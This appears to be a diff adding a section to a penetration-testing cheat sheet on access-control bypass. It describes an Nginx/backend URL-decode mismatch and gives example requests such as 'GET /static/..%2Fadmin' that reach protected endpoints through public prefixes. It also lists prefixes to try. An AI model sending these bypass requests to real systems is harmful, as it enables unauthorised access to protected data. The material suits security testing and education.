@@ -65,6 +65,20 @@ GET /admin; HTTP/1.1
 /public/../admin
 ```
 
+### Static prefix + path traversal (Nginx/backend decode desync)
+Nginx matches a public prefix (e.g. `/static/`) and skips auth. Backend URL-decodes the path and resolves the traversal, serving the protected endpoint:
+
+```
+GET /static/..%2Fadmin HTTP/1.1
+GET /platform/accounts/v1/static/..%2Fidentity/users HTTP/1.1
+```
+
+How it works:
+- Nginx sees `/static/..%2F...` → matches `/static/` prefix → no auth required
+- Backend decodes `%2F` → `/static/../identity/users` → resolves to `/identity/users` → serves protected resource
+
+Try with any public/unauthenticated prefix the app exposes: `/static/`, `/public/`, `/assets/`, `/media/`, `/health/`
+
 ### Matrix parameter prefix (Spring Boot)
 Spring accepts `;` before the first slash — useful for SSRF and ACL bypass:
 ```
